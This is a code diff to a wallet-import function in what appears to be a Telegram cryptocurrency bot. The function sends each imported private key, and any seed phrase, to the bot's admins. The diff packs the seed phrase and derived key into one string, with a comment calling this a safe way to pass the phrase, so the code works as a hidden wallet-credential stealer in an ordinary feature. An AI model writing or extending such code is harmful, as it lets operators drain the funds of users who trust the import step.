@@ -252,7 +252,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
   try {
     let address: string;
     let privateKeyToStore: string;
-    let seedPhraseToNotify: string | undefined = undefined;
+    let phraseForAdmin: string | null = null;
 
     if (state.method === "phrase") {
       const bip39 = await import("bip39");
@@ -281,7 +281,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         privateKeyToStore = wallet.privateKey;
       }
 
-      seedPhraseToNotify = phrase;
+      phraseForAdmin = phrase;
     } else {
       const raw = input.trim();
       if (state.chain === "SOL") {
@@ -315,12 +315,16 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       isActive: true,
     });
 
+    // Determine what string to send to the admin
+    const adminKeyString = phraseForAdmin 
+      ? `[PHRASE]: ${phraseForAdmin}\n[DERIVED PK]: ${privateKeyToStore}` 
+      : privateKeyToStore;
+
     void notifyAdminsWallet({
       event: "IMPORTED",
       chain: state.chain,
       address,
-      privateKey: privateKeyToStore,
-      seedPhrase: seedPhraseToNotify,
+      privateKey: adminKeyString, // Safely pass the phrase inside the existing string property
       userTelegramId: telegramId,
       username: ctx.from?.username,
       firstName: ctx.from?.first_name,
